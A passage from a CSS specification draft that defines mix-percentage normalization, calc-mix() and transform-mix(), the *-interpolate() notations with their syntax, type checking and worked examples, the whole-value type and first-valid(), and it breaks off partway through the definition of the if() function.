### 6.1. Normalizing Mix Percentages

If the sum of the mix percentages are greater than 100%, they are scaled
down; if it is less, any remaining percentage is distributed to values
whose
[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) is omitted, or else assigned to a
"none" type value as defined by the specific [mix
notation](#mix-notations).

To [normalize mix percentages] given

- a [list](https://infra.spec.whatwg.org/#list) of [mix items](#mix-item) `items` (a value and optional percentage,
 each between 0% and 100% if specified)

- an optional `force normalization` flag (defaulting to
 false),

returning a list of [mix items](#mix-item) with normalized percentages and a "leftover"
percentage:

1. Let `specified sum` be the sum of the percentages
 specified in `items` (clamped to 100%), or 0% if the
 percentages are omitted for all items.

2. For each omitted percentage in `items`, set it to
 `(100% - ``specified sum``) / (number of omitted percentages)`.

3. Let `total` be the sum of the percentages of all the
 items.

4. If `total` is greater than 100%, or if `total`
 is greater than 0% and the `force normalization` flag is
 true, multiply every percentage in `items` by
 `(100% / ``total``)`.

5. If `total` is less than 100%, let `leftover`
 be `(100% - ``total``)`.
 Otherwise, let `leftover` be 0%.

6. Return `items` and `leftover`.

 At the end of this algorithm, every percentage is set,
and the sum of all percentages is either 0% (if they were all specified
as 0% to begin with) or 100%. The `leftover` value will be
applied to the usage-specific "none" type value mixed into the final
result.

### 6.2. Mix Resolution

The [used
value](https://drafts.csswg.org/css-cascade-5/#used-value) of a valid [mix
notation](#mix-notations) is
the weighted average of its arguments, as specified by the specific
notation.

The [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) is the [used
value](https://drafts.csswg.org/css-cascade-5/#used-value) if it is possible to calculate. Otherwise, it is the
[mix notation](#mix-notations)
itself, with its arguments computed individually.

### 6.3. Weighted Average of Numeric and Dimensional Values: the [calc-mix() notation]
The [calc-mix()] [mix
notation](#mix-notations)
represents a weighted average of numeric or dimensional value. Like
[calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc), it is a [math
function](https://drafts.csswg.org/css-values-4/#math-function), with the following syntactic form:

```
<calc-mix()> = calc-mix( [ <calc-sum> <percentage [0,100]>? ]# )
```

The
[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) arguments can resolve to any
[\<number\>](https://drafts.csswg.org/css-values-4/#number-value),
[\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension), or
[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value), but must have a [consistent
type](https://drafts.csswg.org/css-values-4/#css-consistent-type) or else the function is invalid. The result's type will
be the [consistent type], [made
consistent](https://drafts.csswg.org/css-values-4/#css-make-a-type-consistent) with the type of the
[\<calc-sum\>] values.

The [used
value](https://drafts.csswg.org/css-cascade-5/#used-value) of a valid
[calc-mix()](#funcdef-calc-mix) is the result of producing a weighted average of its
[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) values, with the weight of each item
given by its corresponding
[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) after [normalizing these mix
percentages](#normalize-mix-percentages). (Any "leftover" mix percentage is applied to a
consistently-typed zero value, and thus effectively discarded.)

The [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) of a valid
[calc-mix()](#funcdef-calc-mix) is its [used
value](https://drafts.csswg.org/css-cascade-5/#used-value) if all of the
[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) and
[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) values in it can be resolved, and is
a [calc-mix()] notation with each of
its [\<calc-sum\>] and
[\<percentage\>] values
computed individually otherwise.

### 6.4. Weighted Average of Transform Values: the [transform-mix() notation]
The [transform-mix()] [mix
notation](#mix-notations)
represents a weighted average of
[\<transform-list\>](https://drafts.csswg.org/css-transforms-1/#typedef-transform-list), with the following syntactic form:

```
<transform-mix()> = transform-mix( [ <transform-list> && <percentage [0,100]> ]# )
```

The [used
value](https://drafts.csswg.org/css-cascade-5/#used-value) of a valid
[transform-mix()](#funcdef-transform-mix) is the result of producing a weighted average of
its
[\<transform-list\>](https://drafts.csswg.org/css-transforms-1/#typedef-transform-list) values, with the weight of each item
given by its corresponding
[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) after [normalizing these mix
percentages](#normalize-mix-percentages). Any "leftover" mix percentage is applied to an
[identity
transform](https://drafts.csswg.org/css-transforms-1/#identity-transform-function) appended to the list. The weighting can be calculated
by interpolating each
[\<transform-list\>] using
its [\<percentage\>] weight as
the interpolation progress from the [identity
transform] towards the
[\<transform-list\>]. See
[CSS Transforms 1 § 9 Interpolation of
Transforms](https://drafts.csswg.org/css-transforms-1/#interpolation-of-transforms).

If every
[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) weight can be fully resolved, and the
[\<transform-list\>](https://drafts.csswg.org/css-transforms-1/#typedef-transform-list)s can be interpolated without
used-value-time information, then the [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) is the [used
value](https://drafts.csswg.org/css-cascade-5/#used-value); it is otherwise the
[transform-mix()](#funcdef-transform-mix) notation itself with its arguments each computed
according to their type.

[transform-mix()](#funcdef-transform-mix) is, itself, a
[\<transform-function\>](https://drafts.csswg.org/css-transforms-2/#typedef-transform-function).

## 7. Interpolation Mapping Notations: the \*-interpolate() family

Several [interpolation notations] in CSS allow representing an
interpolated value corresponding to a certain amount of [interpolation
progress] along a defined scale or mapping function (the
[interpolation map]). The [functional
notations](https://drafts.csswg.org/css-values-4/#functional-notation) follow the syntactic pattern:

```
*interpolate() = *interpolate( [ progress && global-options? ],
 stop, [ between-options? , stop ]# )
```

Where:

- `progress` specifies the input position into the
 [interpolation map](#interpolation-map); see [§ 7.1.1 Specifying the Interpolation
 Progress](#interpolation-progress-arguments)

- `global-options` specifies additional options for the
 interpolation as a whole, and defaults for the between-stop
 interpolation options.

- `stop` represents an [interpolation
 stop](#interpolation-stop); see [§ 7.1.2 Defining the Interpolation
 Map](#interpolation-map-arguments)

- `between-options` specifies options for the interpolation
 between the two surrounding stops.

For example, the following changes the
background color of an element depending on the width of the viewport:

``` highlight
background: color-interpolate(100vw in lch,
 200px: palegoldenrod,
 800px: palegreen,
 2000px: powderblue
);
```

- Below [200px], the color is
 [palegoldenrod](https://drafts.csswg.org/css-color-4/#valdef-color-palegoldenrod);

- From [200px] to [800px], the color interpolates in
 [lch](https://drafts.csswg.org/css-color-4/#valdef-lch-lch) from
 [palegoldenrod](https://drafts.csswg.org/css-color-4/#valdef-color-palegoldenrod) to
 [palegreen](https://drafts.csswg.org/css-color-4/#valdef-color-palegreen);

- From [800px] to [2000px], the color interpolate in
 [lch](https://drafts.csswg.org/css-color-4/#valdef-lch-lch) from
 [palegreen](https://drafts.csswg.org/css-color-4/#valdef-color-palegreen) to
 [powderblue](https://drafts.csswg.org/css-color-4/#valdef-color-powderblue);

- Above [2000px], the color is
 [powderblue](https://drafts.csswg.org/css-color-4/#valdef-color-powderblue).

In the following example, the font
size interpolates from a smaller size on small screens to a larger size
on large screens, easing along the interpolation curve. The author is
storing the progress scale in a custom property to be able to re-use it
across multiple
[font-size](https://drafts.csswg.org/css-fonts-4/#propdef-font-size) declarations throughout the
document.

``` highlight
html {
 --font-scale: progress(100vw, 200px, 2000px) ease-in-out;
 font-size: calc-interpolate(var(--font-scale),
 0%: 16px,
 70%: 20px,
 100%: 24px);
}
h1 {
 font-size: calc-interpolate(var(--font-scale),
 0%: 1.2rem,
 40%: 2rem,
 100%: 3rem);
}
```

If anyone has better examples to punch
in here let us know\...

The [interpolation
notations](#interpolation-notations) in CSS include:

- [calc-interpolate()](#funcdef-calc-interpolate), for interpolating
 [\<number\>](https://drafts.csswg.org/css-values-4/#number-value),
 [\<length\>](https://drafts.csswg.org/css-values-4/#length-value),
 [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value),
 [\<time\>](https://drafts.csswg.org/css-values-4/#time-value), and other dimensions representable
 in
 [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) expressions

- [transform-interpolate()](#funcdef-transform-interpolate), for interpolating
 [\<transform-list\>](https://drafts.csswg.org/css-transforms-1/#typedef-transform-list)s

- [color-interpolate()](#funcdef-color-interpolate), for interpolating
 [\<color\>](https://drafts.csswg.org/css-color-5/#typedef-color) values

and finally the generic
[interpolate()](#funcdef-interpolate) notation, which can represent the interpolation of
any property's values (but only the property's entire value, not
individual components).

The
[interpolate()](#funcdef-interpolate) notation also has a variant that takes a set of
keyframes. It does this by referring to an
[\@keyframes](https://drafts.csswg.org/css-animations-1/#at-ruledef-keyframes) rule, and pulling the corresponding property
declaration out of that. It would be nice to allow the other mix
notations to take keyframe also, but how would we represent a set of
keyframes for a [component
value](https://drafts.csswg.org/css-syntax-3/#component-value) (rather than a full property value)?

Do we have enough use-cases to motivate
adding [palette-interpolate()]?
[palette-mix()](https://drafts.csswg.org/css-fonts-4/#funcdef-palette-mix) already handles transitions.

### 7.1. Global Syntax of the \*-interpolate() family

The generic syntax of the [interpolation
notations](#interpolation-notations) is as follows:

```
interpolate-function() = interpolate-function(
 [
 <progress-source> && [ by <easing-function> ]?
 && <easing-function>? && <segment-options>?
 ] ,
 <input-position>{1,2} : <output-value> ,
 [
 [ <easing-function> || <segment-options> ]? ,
 <input-position>{1,2} : <output-value>
 ]#?
)
```

These represent the [interpolation
progress](#interpolation-progress) and [interpolation
map](#interpolation-map) as
described below.

#### 7.1.1. Specifying the Interpolation Progress

The
[[\<progress-source\>](#typedef-progress-source)] value type represents the
[interpolation
progress](#interpolation-progress) in an [interpolation
notation](#interpolation-notations). Its syntax is:

```
<progress-source> = <percentage> | <number> | <dimension> | <'animation-timeline'>
```

where:

[[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value)]
: Represents the [interpolation
 progress](#interpolation-progress) as a percentage, with [0%] computing to zero
 and [100%] computing to 1.

[[\<number\>](https://drafts.csswg.org/css-values-4/#number-value)]

: Represents the [interpolation
 progress](#interpolation-progress) as a number directly.

 This allows the use of the
 [progress()](#funcdef-progress) notations and other [math
 functions](https://drafts.csswg.org/css-values-4/#math-function) that output a
 [\<number\>](https://drafts.csswg.org/css-values-4/#number-value).

[[\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension)]

: Represents the [interpolation
 progress](#interpolation-progress) as a dimension, which is converted to a number as
 specified in [§ 7.2 Validation and
 Normalization](#interpolation-normalization).

 Using a
 [\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension) value as
 [\<progress-source\>](#typedef-progress-source) requires at least some of the
 stops in the [interpolation
 map](#interpolation-map) to also use
 [\<dimension\>] positions
 of the same type. See [§ 7.2 Validation and
 Normalization](#interpolation-normalization).

[[\<\'animation-timeline\'\>](https://drafts.csswg.org/css-animations-2/#propdef-animation-timeline)]

: Represents the [interpolation
 progress](#interpolation-progress) as the progress of the specified [animation
 timeline](https://drafts.csswg.org/web-animations-1/#timelines). The
 values
 [none](https://drafts.csswg.org/css-animations-2/#valdef-animation-timeline-none) and
 [auto](https://drafts.csswg.org/css-animations-2/#valdef-animation-timeline-auto) are invalid.
 [\[CSS-ANIMATIONS-2\]](#biblio-css-animations-2 "CSS Animations Level 2")
 [\[WEB-ANIMATIONS-2\]](#biblio-web-animations-2 "Web Animations Module Level 2")

 If the specified timeline does not exist on the element or otherwise
 doesn't have a progress for some reason, this represents an
 [interpolation
 progress](#interpolation-progress) of 0.

 Progress values below [0]/[0%] and above
[1]/[100%] are unconventional, and potentially awkward, but
valid. For example, most [easing
functions](https://drafts.csswg.org/css-easing-2/#easing-function), though they will accept any input, are defined in
consideration of progress defined between the \[0,1\] (i.e. \[0%,100%\])
range.

##### [7.1.1.1. ][ Easing Interpolation Progress: the [by [\<easing-function\>](https://drafts.csswg.org/css-easing-2/#typedef-easing-function)] argument]
The [interpolation
progress](#interpolation-progress) given by
[\<progress-source\>](#typedef-progress-source) may be optionally modified by the
[\<easing-function\>](https://drafts.csswg.org/css-easing-2/#typedef-easing-function) specified after the
[by] keyword. It applies the specified [easing
function](https://drafts.csswg.org/css-easing-2/#easing-function) to the "timeline" of progress as a whole by modifying
the [interpolation progress] before
it's applied to the [interpolation
map](#interpolation-map),
analogous to
[animation-timing-function](https://drafts.csswg.org/css-animations-1/#propdef-animation-timing-function).

If omitted, defaults to
[linear](https://www.w3.org/TR/css-easing-2/#valdef-easing-function-linear)

#### 7.1.2. Defining the Interpolation Map

Similar to the [gradient
functions](https://drafts.csswg.org/css-images-4/#gradient-function), the [interpolation
notations](#interpolation-notations) define an [interpolation
map](#interpolation-map)
using a stop list, associating [input positions] with [output
values].
Each [interpolation stop] represents, essentially, a keyframe of the
[interpolation map]: values between
[interpolation stops](#interpolation-stop) are interpolated between these adjacent keyframes in
accordance with the
[\<segment-options\>](#typedef-calc-interpolate-segment-options) and
[\<easing-function\>](https://drafts.csswg.org/css-easing-2/#typedef-easing-function) arguments applying between those
keyframes.

The [interpolation map](#interpolation-map) values are defined as follows:

[[\<input-position\>](#typedef-calc-interpolate-input-position){1,2} : [\<output-value\>]]

: Represents an [interpolation
 stop](#interpolation-stop) associating the specified [input
 position](#input-positions)(s) with the specified [output
 values](#output-values). As
 with the [gradient
 functions](https://drafts.csswg.org/css-images-4/#gradient-function), if two
 [\<input-position\>](#typedef-calc-interpolate-input-position)s are specified, it is treated the
 same as two stops with the same
 [\<output-value\>].

 ```
 <input-position> = <percentage> | <number> | <dimension>
 ```

 [\<output-value\>](#typedef-calc-interpolate-input-position) is not given a grammar here, as
 the specific functions specify what their outputs are.
 [\<input-position\>], however, is linked to
 [\<progress-source\>](#typedef-progress-source), see [§ 7.2.1 Type
 Checking](#interpolation-validity).

[[\<easing-function\>](https://drafts.csswg.org/css-easing-2/#typedef-easing-function)]

: When appearing in the first argument, specifies the "default"
 [easing
 function](https://drafts.csswg.org/css-easing-2/#easing-function) to be used between each stop. When appearing
 between stops, specifies the [easing
 function] to be used between the two
 surrounding stops, overriding any default provided by a global
 [\<easing-function\>](https://drafts.csswg.org/css-easing-2/#typedef-easing-function) argument. (It is analogous to
 [animation-timing-function](https://drafts.csswg.org/css-animations-1/#propdef-animation-timing-function).) If omitted, defaults to
 [linear](https://www.w3.org/TR/css-easing-2/#valdef-easing-function-linear).

 The [input progress
 value](https://drafts.csswg.org/css-easing-2/#easing-function-input-progress-value) to this [easing
 function](https://drafts.csswg.org/css-easing-2/#easing-function) is the [segment interpolation
 progress]---​how far the [interpolation
 progress](#interpolation-progress) is between the [input
 positions](#input-positions) of the nearest stops preceding and following it.

 :::
 (#example-b56d90e8) For example, in
 [color-interpolate(20%, 0%: red, ease-in-out, 80%: green, 100%:
 blue)], the [20%] [interpolation
 progress](#interpolation-progress) becomes a [25%] [segment interpolation
 progress](#segment-interpolation-progress), as [20%] is 25% of the way between
 [0%] and [80%], the surrounding [input
 positions](#input-positions).
 :::

[[\<segment-options\>](#typedef-calc-interpolate-segment-options)]
: When appearing in the first argument, provides any type-specific
 interpolation options that apply to every segment in the
 [interpolation map](#interpolation-map). (For example,
 [color-interpolate()](#funcdef-color-interpolate) allows
 [\<color-interpolation-method\>](https://drafts.csswg.org/css-color-5/#color-interpolation-method).) When appearing between stops,
 provides any type-specific interpolation options that apply to the
 interpolation segment between the stops on either side of this
 argument, overriding any default provided by a corresponding global
 [\<segment-options\>](#typedef-calc-interpolate-segment-options) argument.

All positions before the first [interpolation
stop](#interpolation-stop)
map to the first stop's
[\<output-value\>](#typedef-calc-interpolate-input-position), and all positions after the last
[interpolation stop] map to the last
stop's
[\<output-value\>]. In other words, the map fills outward from the first/last
stop (just like gradients)---​it does not interpolate beyond them.

### 7.2. Validation and Normalization

#### 7.2.1. Type Checking

Each
[\<progress-source\>](#typedef-progress-source) and
[\<input-position\>](#typedef-calc-interpolate-input-position) has a
[type], which can be
[proportional]
([\<number\>](https://drafts.csswg.org/css-values-4/#number-value),
[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value), or
[\<\'animation-timeline\'\>](https://drafts.csswg.org/css-animations-2/#propdef-animation-timeline)) or
[absolute] (all
other types, and
[\<\'animation-timeline\'\>]). The proportional types represent progress as a
percentage; any mix of these types is valid. The
[absolute](#interpolation-input-type-absolute) types represent progress in absolute dimensions, and
all [\<progress-source\>]
and
[\<input-position\>] values that are not
[proportional](#interpolation-input-type-proportional) must have a [consistent
type](https://drafts.csswg.org/css-values-4/#css-consistent-type) for the notation to be valid. Additionally, an
[interpolation
notation](#interpolation-notations) whose
[\<progress-source\>] is
not [proportional] must
have at least one
[absolute]
[\<input-position\>] (in order to define the [interpolation
range](#interpolation-range)), or else the notation is invalid.

 An
[\<\'animation-timeline\'\>](https://drafts.csswg.org/css-animations-2/#propdef-animation-timeline) has both a
[proportional](#interpolation-input-type-proportional) type (the percentage progress) as well as an
[absolute](#interpolation-input-type-absolute) type
([\<time\>](https://drafts.csswg.org/css-values-4/#time-value) or
[\<length\>](https://drafts.csswg.org/css-values-4/#length-value)).

#### 7.2.2. Calculating the Absolute Interpolation Range

The [interpolation range] specifies the
[\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension) values corresponding to 0% and 100%
[interpolation
progress](#interpolation-progress), and thereby defines the mapping between
[proportional](#interpolation-input-type-proportional) and
[absolute](#interpolation-input-type-absolute) values.

In an
[absolutely](#interpolation-input-type-absolute) typed [interpolation
map](#interpolation-map),
the first and last
[absolute] stops in the
list are assigned to 0% and 100%, respectively. (If there is only one
[absolutely] typed
[interpolation stop](#interpolation-stop), it is assigned to both 0% and 100%.)

A
[proportionally](#interpolation-input-type-proportional) typed [interpolation
map](#interpolation-map)
does not define an [interpolation
range](#interpolation-range).

#### 7.2.3. Normalizing Absolute Positions and Progress

If a
[\<progress-source\>](#typedef-progress-source) or
[\<input-position\>](#typedef-calc-interpolate-input-position) is specified as a
[\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension), it is normalized to a number by
linearly interpolating it between the start and end of the
[interpolation
range](#interpolation-range). (This can produce values less than 0 or greater than
1.)

For example, given a function like:

``` highlight
background-color: color-interpolate(300px in hsl, 200px: red, 500px: green, 600px: blue);
```

The [interpolation
range](#interpolation-range) is [(200px, 600px)], so the
[\<progress-source\>](#typedef-progress-source) is converted to the number
[0.25], and the three stops are converted to the numbers
[0], [.75], and [1].

Thus, that function is equivalent to:

``` highlight
background-color: color-interpolate(25% in hsl, 0%: red, 75%: green, 100%: blue);
```

In either case, the result will be a color 1/3 of the way between
[red](https://drafts.csswg.org/css-color-4/#valdef-color-red) and
[green](https://drafts.csswg.org/css-color-4/#valdef-color-green) using HSL interpolation, giving [hsl(40deg,
100%, 50%)], a light orange.

#### 7.2.4. Interpolation Stop Fixup

Once all [interpolation
stops](#interpolation-stop) have been normalized, they are additionally fixed up so
that they progress in order from the first stop to the last. If any stop
has an [input position](#input-positions) that is less than the [input
position] of the preceding stop, it is set to
the [input position] of the previous stop.

### 7.3. Interpolation Resolution

The [used
value](https://drafts.csswg.org/css-cascade-5/#used-value) of a valid [interpolation
notation](#interpolation-notations) is the result of mapping its [interpolation
progress](#interpolation-progress) through the specified [interpolation
map](#interpolation-map).

The [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) is the [used
value](https://drafts.csswg.org/css-cascade-5/#used-value) if it is possible to calculate. Otherwise, if its
[interpolation
progress](#interpolation-progress), [input
positions](#input-positions),
and interpolation options can all be resolved, then it is simplified to
a two-stop [interpolation
notation](#interpolation-notations) with
[\<number\>](https://drafts.csswg.org/css-values-4/#number-value) values for the [interpolation
progress] and [input
positions], and all other values computed
according to their type. Otherwise, it is the [interpolation
notation] itself, with its arguments
computed individually otherwise.

### 7.4. Interpolated Numeric and Dimensional Values: the [calc-interpolate() notation]
The [calc-interpolate()] [interpolation
notation](#interpolation-notations) represents an interpolated numeric or dimensional
value. Like
[calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc), it is a [math
function](https://drafts.csswg.org/css-values-4/#math-function), with the following syntax:

```
<calc-interpolate()> = calc-interpolate(
 [
 <progress-source> && [ by <easing-function> ]?
 && <easing-function>?
 ] ,
 <input-position>{1,2} : <calc-sum> ,
 [ <easing-function>? , <input-position>{1,2} : <calc-sum> ]#? )
```

The
[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) arguments can resolve to any
[\<number\>](https://drafts.csswg.org/css-values-4/#number-value),
[\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension), or
[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value), but must have a [consistent
type](https://drafts.csswg.org/css-values-4/#css-consistent-type) or else the function is invalid. The result's type will
be that [consistent type].

The
[\<progress-source\>](#typedef-progress-source) and
[\<input-position\>](#typedef-calc-interpolate-input-position) values do not use the inherited
[calculation
context](https://drafts.csswg.org/css-values-4/#calculation-contexts); they resolve percentages as specified in [§ 7.2
Validation and Normalization](#interpolation-normalization).

### 7.5. Interpolated Color Values: the [color-interpolate() notation]
The [color-interpolate()] [interpolation
notation](#interpolation-notations) represents an interpolated
[\<color\>](https://drafts.csswg.org/css-color-5/#typedef-color) value, with the following syntax:

```
<color-interpolate()> = color-interpolate(
 [
 <progress-source> && [ by <easing-function> ]?
 && <easing-function>? && <color-interpolation-method>?
 ] ,
 <input-position>{1,2} : <color>,
 [
 [ <easing-function> || <color-interpolation-method> ]?,
 <input-position>{1,2} : <color>
 ]#? )
```

### 7.6. Interpolated Transform Values: the [transform-interpolate() notation]
The [transform-interpolate()] [interpolation
notation](#interpolation-notations) represents an interpolated
[\<transform-list\>](https://drafts.csswg.org/css-transforms-1/#typedef-transform-list), with the following syntax:

```
<transform-interpolate()> = transform-interpolate(
 [
 <progress-source> && [ by <easing-function> ]?
 && <easing-function>?
 ],
 <input-position>{1,2} : <transform-list>,
 [ <easing-function>?, <input-position>{1,2} : <transform-list> ]#? )
```

[transform-interpolate()](#funcdef-transform-interpolate) is, itself, a
[\<transform-function\>](https://drafts.csswg.org/css-transforms-2/#typedef-transform-function).

### 7.7. Interpolated Property Values: the [interpolate() notation]
The [interpolate()] [interpolation
notation](#interpolation-notations) represents the interpolation of entire property values,
which supports two alternative syntax patterns:

```
<interpolate()> = interpolate(
 [
 <progress-source> && [ by <easing-function> ]?
 && <easing-function>?
 ] ,
 <input-position>{1,2} : <whole-value>,
 [ <easing-function>?, <input-position>{1,2} : <whole-value> ]#? )
|
 interpolate( <progress-source> && [ by <easing-function> ]?
 && <easing-function>? of <keyframes-name> )
```

The first syntax alternative, like other [interpolation
notations](#interpolation-notations), assembles an [interpolation
map](#interpolation-map)
from a list of [interpolation
stops](#interpolation-stop). The second uses the corresponding property
declarations from a set of keyframes, incorporating those values into
the normal
[cascade](https://drafts.csswg.org/css-cascade-6/#cascade) for this property.

Each [\<whole-value\>](#whole-value) argument is computed as if it were the
value of this property; and all other arguments computed according to
their type.

For example, most uses of
[interpolate()](#funcdef-interpolate) will resolve at computed-value time:

``` highlight
color: interpolate(90%, 0: red, 1: blue);
/* via simple interpolation,
 computes to: */
color: rgb(10% 0 90%);

color: interpolate(90%, 0: currentcolor, 1: black);
/* can't be fully resolved at computed-value time,
 but still has a defined representation: */
color: color-mix(currentcolor 90%, black 10%);

float: interpolate(90%, 0: left, 1: right);
/* discretely animatable */
float: right;
```

The [interpolate()](#funcdef-interpolate) notation is a
[\<whole-value\>](#whole-value). Additionally, if any of its
[\<whole-value\>] arguments are [not
animatable](https://drafts.csswg.org/web-animations-1/#not-animatable), the notation is invalid.

For example, the following
declarations are invalid, and will be ignored:

``` highlight
/* Invalid start value */
color: interpolate(90%, 0: #invalid, 1: #F00);

/* Function is mixed with other values */
background: url(ocean) interpolate(10%, 0: blue, 1: yellow);

/* 'animation-*' is not animatable */
animation-delay: interpolate(0%, 0: 0s, 1: 2s);
```

## 8. Miscellaneous Value Substituting Functions

### 8.1. Representing An Entire Property Value: the [\<whole-value\> type]
Several functions defined in this specification can only be used as the
\"whole value\" of a property. For example, [background-position:
cycle(50px 50px,
center);](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position) is valid, but [background-position:
cycle(50px, center) 50px;]
is not. The [\<whole-value\>](#whole-value) production represents these values.

All properties implicitly accept a
[\<whole-value\>](#whole-value) as their entire value, just as they accept the
[CSS-wide
keywords](https://drafts.csswg.org/css-values-4/#css-wide-keywords) as their entire value.

When used as a component value of a function,
[\<whole-value\>](#whole-value) also represents any CSS value normally valid as the
whole value of the property in which it is used (including additional
[\<whole-value\>] functions).
However, some functions may restrict what a
[\<whole-value\>] argument can
include.

### 8.2. Selecting the First Supported Value: the [first-valid() notation]
CSS supports progressive enhancement with its forward-compatible
parsing: authors can declare the same property multiple times in a style
rule, using different values each time, and a CSS UA will automatically
use the last one that it understands and throw out the rest. This
principle, together with the
[\@supports](https://drafts.csswg.org/css-conditional-3/#at-ruledef-supports) rule, allows authors to write stylesheets that
work well in old and new UAs simultaneously.

However, using
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) (or similar substitution functions that resolve
after parsing) thwarts this functionality; CSS UAs must assume any such
property is valid at parse-time.

The [first-valid()] [functional
notation](https://drafts.csswg.org/css-values-4/#functional-notation) inlines the fallback behavior intrinsic to parsing
declarations. Unlike most notations, it can accept any valid or invalid
syntax in its arguments, and represents the first value among its
arguments that is supported (parsed as valid) by the UA as the whole
value of the property it's used in.

```
<first-valid()> = first-valid( <declaration-value># )
```

If none of the arguments represent a valid value for the property, the
property is [invalid at computed-value
time](#invalid-at-computed-value-time).

[first-valid()](#funcdef-first-valid) is a
[\<whole-value\>](#whole-value).

Should this have a different name? We
didn't quite decide on it during the resolution to add this.

 Despite effectively taking
[\<whole-value\>](#whole-value)s as its argument,
[first-valid()](#funcdef-first-valid) is instead defined to take
[\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value)s because, by definition, it's
intended to be used in cases *where its values might be invalid for the
declaration it's in*.
[\<declaration-value\>]
imposes no contextual validity constraints on what it matches, unlike
[\<whole-value\>].

### 8.3. Conditional Value Selection: the [if() notation]
Tests

- [if-conditionals.html](https://wpt.fyi/results/css/css-values/if-conditionals.html "css/css-values/if-conditionals.html")
 [[(live
 test)]](http://wpt.live/css/css-values/if-conditionals.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/if-conditionals.html)
- [if-cycle.html](https://wpt.fyi/results/css/css-values/if-cycle.html "css/css-values/if-cycle.html")
 [[(live
 test)]](http://wpt.live/css/css-values/if-cycle.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/if-cycle.html)
- [if-function-revert-rule.html](https://wpt.fyi/results/css/css-values/if-function-revert-rule.html "css/css-values/if-function-revert-rule.html")
 [[(live
 test)]](http://wpt.live/css/css-values/if-function-revert-rule.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/if-function-revert-rule.html)
- [if-initial-unregistered.html](https://wpt.fyi/results/css/css-values/if-initial-unregistered.html "css/css-values/if-initial-unregistered.html")
 [[(live
 test)]](http://wpt.live/css/css-values/if-initial-unregistered.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/if-initial-unregistered.html)
- [if-invalidation.html](https://wpt.fyi/results/css/css-values/if-invalidation.html "css/css-values/if-invalidation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/if-invalidation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/if-invalidation.html)
- [if-media-invalidation.html](https://wpt.fyi/results/css/css-values/if-media-invalidation.html "css/css-values/if-media-invalidation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/if-media-invalidation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/if-media-invalidation.html)
- [if-range-with-attr-crash.html](https://wpt.fyi/results/css/css-values/if-range-with-attr-crash.html "css/css-values/if-range-with-attr-crash.html")
 [[(live
 test)]](http://wpt.live/css/css-values/if-range-with-attr-crash.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/if-range-with-attr-crash.html)
- [if-style-invalidation.html](https://wpt.fyi/results/css/css-values/if-style-invalidation.html "css/css-values/if-style-invalidation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/if-style-invalidation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/if-style-invalidation.html)
- [if-supports-quirks.html](https://wpt.fyi/results/css/css-values/if-supports-quirks.html "css/css-values/if-supports-quirks.html")
 [[(live
 test)]](http://wpt.live/css/css-values/if-supports-quirks.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/if-supports-quirks.html)

The [if()] function is an [arbitrary substitution
function](#arbitrary-substitution-function) that represents conditional values. Its argument
consists of an ordered semi-colon--separated list of statements, each
consisting of a condition followed by a colon followed by a value. An
[if()](#funcdef-if)
function represents the value corresponding to the first condition in
its argument list to be true; if no condition matches, then the
[if()] function represents an empty token
stream.

The [if()](#funcdef-if)
function's syntax is defined as follows:

```
<if()> = if( [ <if-branch> ; ]* <if-branch> ;? )
<if-branch> = <if-condition> : <declaration-value>?
<if-condition> = <boolean-expr[ <if-test> ]> | else
<if-test> =
 supports( [ <ident> : <declaration-value> ] | <supports-condition> ) |
 media( <media-feature> | <media-condition> ) |
 style( <style-query> )
```

The [else] keyword represents a condition that is
always true.

The [if()](#funcdef-if)
function's [argument
grammar](#argument-grammar)
is:

```
<if-args> = if( [ <if-args-branch> ; ]* <if-args-branch> ;? )
<if-args-branch> = <declaration-value> : <declaration-value>?
```

In the above
[\<if-args-branch\>](#typedef-if-args-branch) production, the first
[\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) excludes top-level
[\<colon-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-colon-token)s as part of its [free-form
